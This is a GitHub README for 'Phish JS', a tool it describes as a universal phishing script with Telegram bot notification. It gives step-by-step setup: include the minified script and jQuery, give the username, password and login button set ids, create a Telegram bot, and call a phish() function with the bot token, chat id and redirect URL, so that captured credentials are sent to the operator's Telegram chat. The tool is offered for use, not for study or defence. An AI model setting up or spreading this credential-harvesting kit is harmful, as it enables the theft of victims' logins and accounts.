<p align="center">
    <img src="https://i.postimg.cc/NG8KJWZ1/external-content-duckduckgo-com.png" alt="logo" width="154" height="154">
</p>

<h2 align="center">Phish JS</h2>

<p align="center">
     Universal phishing script + Telegram bot notification
</p>

[![https://t.me/xruin](https://img.shields.io/badge/sponsors-0-brightgreen)](https://t.me/xruin)
[![Privatium](https://img.shields.io/github/license/xbaysal11/privatium)](https://github.com/xbaysal11/phish-js)
[![Github](https://img.shields.io/github/followers/xbaysal11?style=social)](https://github.com/xbaysal11)
[![Privatium](https://img.shields.io/github/stars/xbaysal11/phish-js?style=social)](https://github.com/xbaysal11/phish-js)
[![https://t.me/xruin](https://img.shields.io/badge/%F0%9F%92%AC%20Telegram-xruin-blue.svg)](https://t.me/xruin)

---

# Documentation

## 1. Download files or clone
  - [Download files](https://github.com/xbaysal11/phish-js/archive/master.zip).

## 2. Put "phish.min.js" file to your project

## 3. Import "phish.min.js"
```
<script src="phish.min.js"></script>
```

## 4. Import "JQuery"
Via [CDN](https://code.jquery.com/)  is the quickest and easiest way to get JQuery on your website.

```
<script src="https://code.jquery.com/jquery-3.4.1.slim.min.js" integrity="sha256-pasqAKBDmFT4eHoN2ndd6lN370kFiGUFyTiUHWhU7k8=" crossorigin="anonymous"></script>
```

## 5. Set ids to inputs and button

```
<input type="text" id='username'>
<input type="password" id='password'>

<button type="button" id='submit-button'>Login</button>
```

## 6. Get TOKEN and CHAT_ID

 - 1. Create bot with `@BotFather` and copy bot TOKEN
 - 2. Open your bot and type `/start` 
 - 3. Get chat id here:  `https://api.telegram.org/bot<TOKEN>/getUpdates`

## 7. Call function

```
<script>
    $(document).ready(function () {
        const BOT_TOKEN = 'your_bot_token',
            CHAT_ID = 'your_chat_id',
            REDIRECT_URL = 'default_redirect_url'
        phish(BOT_TOKEN, CHAT_ID, REDIRECT_URL);
    });
</script>
```
---

### SPONSORS [[Become a sponsor](https://t.me/xruin)]

[![https://t.me/xruin](https://img.shields.io/badge/sponsors-0-brightgreen)](https://t.me/xruin)

---

### LICENSE

Phish JS is [MIT licensed.](https://github.com/xbaysal11/phish-js/blob/master/LICENSE)
